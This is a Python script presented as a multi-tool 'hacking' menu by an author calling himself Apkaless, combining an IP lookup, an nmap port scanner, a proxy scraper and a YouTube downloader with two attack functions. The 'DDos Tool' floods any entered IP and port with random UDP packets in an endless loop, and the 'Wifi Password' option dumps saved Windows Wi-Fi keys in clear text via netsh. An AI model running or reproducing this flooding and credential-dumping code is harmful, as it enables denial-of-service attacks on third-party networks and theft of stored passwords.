import socket
import sys
import random
import time
import nmap
import threading
import proxyscrape
import subprocess
import os
from pafy import new
import colorama
from colorama import Fore, Back, Style
# code started

# This is Code For Hostname Tool


def gethostbyname1():
      os.system("clear") 
      os.system("figlet IP TOOL")
      print("")
     #  print("""Welcome To IP Tool\n
     #      Creator: Apkaless\n
     #      Country: Iraq\n""")
      hostname = input(str(Fore.GREEN + "Enter Any Host Name: "))
      ipaddress = socket.gethostbyname(hostname)
      time.sleep(1)
      print("")
      print(Fore.GREEN + "IP Address of the hostname {} is : {}" .format(hostname, Fore.BLUE + ipaddress))
      time.sleep(1)
      print("")
      print(Fore.GREEN + "This Tool Was Created By Apkaless ☣")
      time.sleep(1)
      print("")
      print(Fore.GREEN + "Thanks For Using My Tool ☣")
      time.sleep(1)
      print("")
      print(Fore.GREEN + """Select An Action:\n
               1) DDos IP
               2) Scan IP
               3) Exit\n""")
      answer = input(Fore.GREEN + "Choose Option: ")
      if answer == "1":
           ddostool()
      elif answer == "2":
           scanner()
            
      else:
           starting()

# This is The End Of The Code


# This Code Of DDos Tool

def ddostool():
     os.system("clear")
     os.system("figlet DDos Tool")
     # print("\nDDos Tool By Apkaless")
     time.sleep(1)
     print("")
     # # print("Country: Iraq")
     # time.sleep(1)
     # print("")
     #####################################################
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     bytes = random._urandom(10000)
     #####################################################
     host = input(Fore.GREEN + "Target IP: ")
     time.sleep(1)
     print("")
     print(Fore.GREEN + "The Default Port is 80")
     time.sleep(1)
     print("")
     port = int(input(Fore.GREEN + "Port: "))
     sent = 0
     os.system("clear")
     os.system("figlet DDos Starting.....")
     time.sleep(2)
     print(Fore.GREEN + "[=======] 0%")
     time.sleep(1)
     print(Fore.GREEN + "[===============] 25%")
     time.sleep(2)
     print(Fore.GREEN + "[======================] 50%")
     time.sleep(3)
     print(Fore.GREEN + "[==========================] 75%")
     time.sleep(4)
     print(Fore.GREEN + "[===============================] 100%")
     time.sleep(5)
     while True:
          s.connect((host,port))
          s.sendto(bytes, (host,port))
          sent = sent + 1
          print(Fore.GREEN + "Attacking %s packets to %s" %(sent,host))
          if port == 66534:
               port = 1

#This is The End Of Code

#This Code For Scanner tool

def scanner():
     # print("\nWelcome To Scanner Tool")
     # print("<------------------------------------->")
     # print("Creator: Apkaless")
     # print("")
     # print("Country: IRAQ")
     # print("")
     os.system("clear")
     os.system("figlet IP SCANNER")
     print("")
     nmScan = nmap.PortScanner()
     host = input(Fore.GREEN + "Enter The IP Address You Want To Scan: ")
     print("")
     time.sleep(1)
     print(Fore.GREEN + "Your IP Address is:",Fore.BLUE + host)
     print("")
     time.sleep(1)
     # print("Thanks For Using My Tool")
     # time.sleep(1)
     res = input(Fore.GREEN + """Please Select A Method:\n
               1) SYN ACK Scan
               2) UDP Scan\n
               Option --> """)
     time.sleep(1)
     print("")
     print(Fore.GREEN + "You Selected Option: ",Fore.BLUE + res)
     print("")
     if res == "1": # SYN ACK SCAN 
          print(Fore.GREEN + "Nmap Version",nmScan.nmap_version())
          print("")
          time.sleep(1)
          print(Fore.GREEN + "Scanning.....")
          print("")
          nmScan.scan(host,'1-1024','-sV')
          print(nmScan.scaninfo())
          print("")
          for host in nmScan.all_hosts():
               print(Fore.GREEN + "Host: %s" %(Fore.BLUE + host))
               print("")
               print(Fore.GREEN + "State: %s" %(nmScan[host].state()))
               print("")
          for proto in nmScan[host].all_protocols():
               print(Fore.GREEN + "Protocol: %s" %(Fore.BLUE + proto))
               print("")
               for key in nmScan[host]['tcp'].keys():
                    print("--------------------")
                    print(Fore.GREEN + "Port: %s %s %s \n" %(Fore.BLUE + key,proto,nmScan[host].tcp(key)))
          print("")
          input(Fore.GREEN + "Press Enter To Back..... ")
          starting()
     elif res == "2":
          print("Nmap Version",nmScan.nmap_version())
          print("Scanning.....")
          nmScan.scan(host,'1-1024','-v -sU')
          print(nmScan.scaninfo())
          for host in nmScan.all_hosts():
               print("Host: %s" %(Fore.BLUE + host))
               print("State: %s" %(nmScan[host].state()))
          for protocol in nmScan[host].all_protocols():
               print("Protocol: %s" %(Fore.BLUE + protocol))
     else:
        print(Fore.GREEN + "Please Select a Valid Option\n")
        input(Fore.GREEN + "Press Enter To Back..... ")
        starting()

# This The End Of The Code

def scraper():
     os.system("clear")
     os.system("figlet PROXY SCRAPER")
     collector = proxyscrape.create_collector('default','socks4')
     proxies = collector.get_proxies({'country' : 'united states'})
     print(Fore.GREEN + "\nScraping Proxies.....\n")
     time.sleep(5)
     print(proxies)
     input(Fore.GREEN + "\nPress Enter To Back..... ")
     starting()

def wifiPassword():
     print(Fore.GREEN + "Wifi Password Tool 2020")
     print("")
     data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\n')
     profiles = [i.split(':')[1][1:-1] for i in data if "All User Profile" in i] # Wifi Name
     for i in profiles:
          try:
               result = subprocess.check_output(['netsh','wlan','show','profile', i, 'key=clear']).decode('utf-8', errors="backslashreplace").split('\n')
               result = [b.split(":")[1][1:-1] for b in result if "Key Content" in b] # Wifi Password
               try:
                   for password in result:
                       print(Fore.GREEN + "Wifi Name: {}\n\nPassword: {}" .format(i,password))
               except IndexError:
                    print(Fore.GREEN + "Wifi Name: {} Password: {}" .format(i,""))
          except subprocess.CalledProcessError:
               print(Fore.GREEN + "Wifi Name: {} {}" .format(i,"ENCODING ERROR"))
     print("")
     input(Fore.GREEN + "Coded By Apkaless ")

def videoDownload():
     os.system("clear")
     os.system("figlet YouTube Video")
     url = input(Fore.GREEN + "Enter YouTube Video Link: ")
     print("")
     video = new(url)

     def forVideo():

          streams = video.streams
          i = 0 
          for stream in streams:
               print("\n",str(i),"-",stream,"\n")
               i += 1
          streamNumber = int(input(Fore.GREEN + "Enter Number 0 OR 1 : "))
          print(Fore.GREEN + "\nYour Option : ",Fore.BLUE + streamNumber,"\n")
          streams[streamNumber].download()
          print(Fore.GREEN + "\nYour Video Successfully Downloaded\n")
          print(Fore.GREEN + "Your Video Path : /root\n")
          input(Fore.GREEN + "Press Enter To Back..... ")
          starting()

     def forAudio():

          audios = video.audiostreams
          a = 0
          for audio in audios:
               print(Fore.GREEN + "\n",str(a),"-",audio,"\n")
               a += 1
          audioNumber = int(input(Fore.GREEN + "Enter Number: "))
          print("")
          audios[audioNumber].download()
          print(Fore.GREEN + "\nYour Audio File Successfully Downloaded\n")
          print(Fore.GREEN + "Your Audio File Path: /root\n")
          input(Fore.GREEN + "Press Enter To Back.....")
          starting()

     streamType = input(Fore.GREEN + """Select Option:
                                      
                          1) Video 

                          2) Audio File

       Enter Number 1 OR 2 : """)

     if streamType == "1":
          forVideo()
     elif streamType == "2":
          forAudio()
     else:
          input(Fore.GREEN + "Press Enter To Back.....")
          starting()

def starting():
     print(Fore.GREEN)
     os.system("clear")
     os.system("figlet Apkaless")
     print("")
     print(Fore.GREEN + "[☣] Creator   : APKALESS")
     print(Fore.GREEN + "[☣] Country   : IRAQ")
     print(Fore.GREEN + "[☣] YouTube   : https://www.youtube.com/channel/UCghQXaAH2PXS67c84b6txKw")
     print(Fore.GREEN + "[☣] Github    : https://github.com/Apkaless")
     print(Fore.GREEN + "[☣] Facebook  : https://www.facebook.com/Apkaless")
     print(Fore.GREEN + "[☣] Instagram : https://www.instagram.com/Apkaless")
     print(Fore.GREEN + "[☣] Server    : Online")
     print(Fore.GREEN + """
=================================================
               created by Apkaless                 
=================================================
               ++++++++++++++++++++                                                                                                         
                                                  
                                                  
           Apkaless                              
       _,.                   
     ,` -.)                  
    ( _/-\\-._               
   /,|`--._,-^|            ,  
   \_| |`-._/||          , |  
     |  `-, / |         /  /  
     |     || |        /  /   
      `r-._||/   __   /  /    
  __,-<_     )`-/  `./  /    
  \   `---    \   / /  /      
     |           |./  /       
     /           //  /       
 \_/  \         |/  /        
  |    |   _,^- /  /          
  |    , ``  (\/  /_          
   \,.->._    \X-=/^          
   (  /   `-._//^`            
    `Y-.____(__}               
     |     {__)              
   
           ()   V.1.0        
""")
     try:
          # print("Verifying The Code....")
          # time.sleep(2)
          # print("")
          starthacking = input(Fore.GREEN + """What Do You Want?\n
                    1) Get IP Tool

                    2) Scanner Tool

                    3) DDos Tool

                    4) Proxy Scraper

                    5) Wifi Password (This Option Don't Work On Linux)

                    6) YouTube Video Download\n
                                        
Press Ctrl + C To Exit From This Tool.\n
          Choose Option -----> """)

          if starthacking == "1":
               gethostbyname1()
          if starthacking == "2":
               scanner()
          if starthacking == "3":
               ddostool()
          if starthacking == "4":
               scraper()
          if starthacking == "5":
               wifiPassword()
          if starthacking == "6":
               videoDownload()
     except KeyboardInterrupt:
          print(Fore.GREEN + " \n\nHave A Nice Day ;)\n")
print(Fore.GREEN)
os.system("clear")
os.system("figlet Apkaless")
print("")
print(Fore.GREEN + "Please Wait While",Fore.BLUE + "Apkaless", Fore.GREEN + "Setting Up His Own Tool\n")
time.sleep(2)
print("Please Install The Requirements From", Fore.BLUE + "Requirements.txt")
time.sleep(5)
starting()

# os.system("clear")
# os.system("figlet Apkaless")
# print("")
# print("Creator : APKALESS")
# print("Country : IRAQ")
# print("YouTube : https://www.youtube.com/channel/UCghQXaAH2PXS67c84b6txKw")
# print("Github  : https://github.com/Apkaless")
# print("Facebook: https://www.facebook.com/Apkaless")
# print("")
# starting()


# ActivationCode = input("Activation Code: ")
# print("")

# if ActivationCode == "APIQIRAQ110HACKER":
#       starting()
# else:
#       print("Verifying The Code....")
#       time.sleep(2)
#       print("")
#       print("The Code is Wrong")
#       print("")
#       input("Press Enter To Exit....")

# #code ended


